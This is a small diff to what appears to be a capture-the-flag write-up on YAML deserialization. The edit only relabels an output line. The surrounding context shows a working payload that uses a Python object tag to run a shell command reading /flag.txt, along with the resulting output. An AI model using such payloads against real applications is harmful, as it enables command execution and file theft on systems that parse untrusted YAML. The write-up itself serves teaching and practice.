@@ -276,6 +276,6 @@ application:
 probe: !!python/object/apply:subprocess.getoutput
 - "sh -c 'cat /flag.txt 2>&1 || true'"
 ```
-**Processed output returned :** `{'application': {'name': 'MyApp'}, 'probe': 'FLAG'}`
+**Output :** `{'application': {'name': 'MyApp'}, 'probe': 'FLAG'}`
 ![Desktop View](/YAML2.png){: width="600" height="350" }
 
